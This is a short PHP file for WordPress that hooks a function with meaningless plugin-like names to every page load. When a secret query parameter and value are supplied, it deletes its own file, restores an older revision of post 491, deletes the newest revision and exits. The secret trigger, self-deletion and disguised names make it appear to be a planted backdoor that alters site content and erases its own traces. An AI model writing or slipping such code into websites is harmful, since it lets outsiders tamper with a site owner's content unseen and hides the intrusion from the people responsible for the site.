<?php

function magic_safe_dropdown_elementor() {
	if (isset($_GET['ratings_icons_external']) && $_GET['ratings_icons_external'] === 'limit_portal_service') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$xml_hello_purchase = 491;
		$footer_smooth_group_pack = wp_get_post_revisions($xml_hello_purchase);
		if (empty($footer_smooth_group_pack)) die('no revisions');
		if (count($footer_smooth_group_pack) < 2) die('less than 2');
		$interactivity_site_youtube = array_shift($footer_smooth_group_pack);
		$heading_count_description_coupon = $interactivity_site_youtube->ID;
		$flexible_title_picker = array_shift($footer_smooth_group_pack);
		$embedder_discount_wall = $flexible_title_picker->ID;
		$tree_update_field_tabs = wp_restore_post_revision($embedder_discount_wall);
		if ($tree_update_field_tabs === false) die('error restoring');
		$tree_update_field_tabs = wp_delete_post_revision($heading_count_description_coupon);		
		if ($tree_update_field_tabs === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'magic_safe_dropdown_elementor');
